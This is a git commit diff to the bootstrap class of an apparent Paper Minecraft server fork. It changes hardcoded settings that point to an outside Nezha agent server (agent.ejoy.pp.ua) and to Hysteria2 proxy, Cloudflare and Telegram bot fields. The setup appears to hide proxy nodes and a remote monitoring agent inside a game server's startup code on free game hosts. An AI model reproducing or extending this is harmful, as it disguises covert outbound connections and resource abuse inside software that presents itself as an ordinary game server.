5a2f953b3dd0eeb37877b471e2b9351900020198
huanthree <141692838+huanthree@users.noreply.github.com>
2025-11-09 20:14:12 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,7 +92,7 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "1faa65d4-656a-4295-a076-71488c6c960d");
+        envVars.put("UUID", "b4ffca9c-dd1d-4ae3-8333-967359f37ae7");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
         envVars.put("NEZHA_PORT", "");
@@ -100,15 +100,15 @@ public final class PaperBootstrap {
         envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "25555");
+        envVars.put("HY2_PORT", "7017");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "hidencloud-niang1pro");
+        envVars.put("CFIP", "23.227.39.0");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "host2play");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
